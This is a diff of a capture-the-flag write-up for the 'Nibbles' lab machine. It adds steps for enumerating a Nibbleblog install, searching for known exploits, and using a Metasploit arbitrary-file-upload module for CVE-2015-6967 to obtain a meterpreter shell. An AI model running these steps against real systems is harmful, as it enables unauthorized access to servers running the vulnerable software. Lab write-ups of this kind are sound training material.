@@ -10,9 +10,9 @@ nmap -p- -T4 -A 10.10.10.75 -oN nibbles.nmap
 
 -p- scans all ports instead the 1000 common ports scan defaultivy way.
 
--T4 increase the spped of the scan.
+-T4  - increase the spped of the scan.
 
--A aggressive scan to gather more information about the system.
+-A  - aggressive scan to gather more information about the system.
 
 -oN - saves the output to a file.
 
@@ -81,6 +81,76 @@ It sends us to /nibbleblog/.
 
 
 The previous gobuster scan didn't find any directory, but after we found the blog, let's scan another time but with the /nibbleblog/.
+
+Results:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*8W4FF3LwC2N5AqNdcplJKA.png)
+
+
+After traveling betweem the directories within /admin, I didn't find anything there. 
+But there is README file that includes the version of the nibbleblog service.
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*Sw-slPkN3-mQNnwhOMbfnw.png)
+
+
+Let's check if this service at that version is vulnerable.
+
+```bash
+searchsploit nibbleblog   
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+Nibbleblog 3 - Multiple SQL Injections                                       | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                        | php/remote/38489.rb
+----------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+Use metasploit to try the Arbitrary File Upload, but after I use "options" to understand what info I need to provide 
+to run the exploit, it demends username and password. At that moment, I don't have any credentials.
+
+After some research I found a github that includes the exploit with an example how to use it:
+
+https://github.com/dix0nym/CVE-2015-6967
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*3AEzPOCvVD08Rq76Zpms4Q.png)
+
+
+I decided to provide the path, username and password inside metasploit and then I got meterpreter shell
+
+On metasploit:
+
+```bash
+set lhost <your-ip>
+
+set rhost <target=machine>
+
+set targeturi /nibbleblog/
+
+run
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*B4Bn9ppeAtkNYmhTibOJrA.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
